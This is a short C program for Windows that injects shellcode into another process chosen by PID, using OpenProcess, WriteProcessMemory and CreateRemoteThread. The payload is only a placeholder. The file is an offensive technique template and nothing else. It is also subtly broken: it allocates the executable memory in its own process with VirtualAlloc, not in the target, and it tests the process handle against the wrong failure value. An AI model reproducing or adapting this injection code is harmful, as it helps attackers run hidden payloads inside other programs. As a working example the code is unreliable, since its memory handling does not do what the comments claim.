#include <handleapi.h>
#include <minwinbase.h>
#include <minwindef.h>
#include <processthreadsapi.h>
#include <windows.h>
#include <winnt.h>

/*
* With a given PID we will be creating a thread on in 
* to inject the shellcode
*/

int main(int argc, char *argv[]) {
  unsigned char shellcode[] = "...";

  // Conver the arg to int
  int pid = atoi(argv[1]);

  // Getting handle to the process
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, // Desired Access Level
                                FALSE,
                                pid // target process id
  );

  // Checking if handle is valid
  if (hProcess == INVALID_HANDLE_VALUE)
    return 0;

  LPVOID hMemory =
      VirtualAlloc(NULL,              // We dont care where it is located on
                   sizeof(shellcode), // Size of mem to reserve
                   MEM_COMMIT | MEM_RESERVE, // Type of memory location
                   PAGE_EXECUTE_READWRITE    // Memory protection
      );

  // Write onto memory
  SIZE_T bytesWritten = 0;
  WriteProcessMemory(hProcess,          // handle to the target process
                     hMemory,           // handle to target mem region
                     &shellcode,        // pointer to data to write
                     sizeof(shellcode), // size of data to write
                     &bytesWritten      // receives the number of bytes written
  );

  // Create a new thread
  DWORD threadId = 0;
  HANDLE hThread = CreateRemoteThread(hProcess, // Handle to target process
                                      NULL, 0, (LPTHREAD_START_ROUTINE)hMemory,
                                      NULL, 0, &threadId);

  // wait to the thread to finish
  WaitForSingleObject(hThread, INFINITE);

  // Close thread handle
  CloseHandle(hThread);
}
